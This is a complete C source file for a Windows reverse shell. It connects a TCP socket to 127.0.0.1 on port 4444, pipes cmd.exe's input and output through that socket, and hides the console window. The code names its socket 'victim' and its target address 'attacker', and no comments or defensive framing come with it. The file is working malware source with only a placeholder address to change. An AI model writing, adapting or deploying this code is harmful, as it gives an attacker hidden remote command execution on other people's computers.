#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int main(void) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET victim = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in attacker;
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444);
    attacker.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(victim, (struct sockaddr*)&attacker, sizeof(attacker));

    STARTUPINFO startup_info = { 0 };
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)victim;

    PROCESS_INFORMATION process_info;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info);
    WaitForSingleObject(process_info.hProcess, INFINITE);
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);

    closesocket(victim);
    WSACleanup();
    return 0;
}
